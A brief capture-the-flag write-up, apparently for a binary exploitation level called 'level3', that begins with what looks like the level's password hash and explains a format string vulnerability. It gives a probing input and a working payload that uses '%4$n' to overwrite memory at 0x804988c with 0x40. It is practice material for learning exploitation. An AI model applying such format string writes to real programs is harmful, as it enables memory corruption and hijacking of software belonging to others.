level3:492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

format string vuln

modify value of `0x804988c` to `0x40`

The first thing we print arrives at the fourth arguement, tested with `AAAA %x %x %x %x %x %x %x`

We use this payload `"\x8c\x98\x04\x08" + "A" * 60 + "%4$n"` -> `%4$n` change the value of the 4th argument to the number of char printed up to now.

`0x40` = `64`